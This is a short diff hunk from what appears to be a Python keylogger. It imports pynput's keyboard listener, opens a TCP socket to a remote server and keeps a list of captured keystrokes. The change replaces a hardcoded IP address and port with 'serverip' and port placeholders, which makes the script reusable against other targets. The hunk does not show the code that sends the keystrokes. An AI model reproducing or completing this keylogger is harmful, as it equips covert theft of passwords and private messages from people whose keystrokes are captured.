@@ -12,7 +12,7 @@ from pynput import keyboard
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Connect to the server
-s.connect(('192.168.43.1', 1234))
+s.connect(('serverip', port))
 
 # Initialize a list to store the keystrokes
 keystrokes = []
